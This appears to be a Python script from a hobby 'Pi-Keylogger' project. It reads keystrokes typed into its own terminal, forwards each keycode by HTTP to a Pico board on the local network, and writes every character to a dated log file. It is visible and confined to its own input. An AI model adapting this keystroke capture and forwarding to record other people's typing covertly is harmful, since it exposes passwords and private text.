import getch
import signal
import time
import requests

PICO_IP = "192.168.36.30"  # Change this to match your Pico's IP

def handler(signum, frame):
    log(chr(26), date)

def log(char, date):
    keycode = ord(char)
    print(f"Sending keycode {keycode} to {PICO_IP}")

    try:
        response = requests.get(f"http://{PICO_IP}/?key={keycode}")
        print(f"Response: {response.status_code} - {response.text}")
    except requests.RequestException as e:
        print(f"Error sending request: {e}")

    if keycode == 5:
        exit()
    elif keycode == 13:
        char = "\n"
    elif keycode == 127:
        char = " Backspace "
    elif keycode == 218:
        char = " UpArrow "
    elif keycode == 217:
        char = " DownArrow "
    elif keycode == 216:
        char = " LeftArrow "
    elif keycode == 215:
        char = " RightArrow "

    with open(f"/home/rikka/Pi-Keylogger/log/{date}.txt", "a+") as f:
        f.write(char)

def arrow(char):
    if ord(char) == 65:
        return 218  # Up Arrow
    elif ord(char) == 67:
        return 215  # Right Arrow
    elif ord(char) == 68:
        return 216  # Left Arrow
    elif ord(char) == 66:
        return 217  # Down Arrow
    else:
        return 0

date = time.strftime("%c").replace(" ", "-")
print(date)

with open(f"/home/rikka/Pi-Keylogger/log/{date}.txt", "w+") as f:
    f.write(f"Started at {date}\n")

signal.signal(signal.SIGTSTP, handler)

while True:
    try:
        try:
            char = getch.getch()
            if ord(char) == 27:  # Escape sequence (arrow keys, etc.)
                _char = getch.getch()
                if ord(_char) == 91:  # Arrow key indicator
                    char = chr(arrow(getch.getch()))
                    log(char, date)
                else:
                    log(char, date)
                    log(_char, date)
            else:
                log(char, date)
        except KeyboardInterrupt:
            pass
    except KeyboardInterrupt:
        log(chr(3), date)
    except OverflowError:
        pass
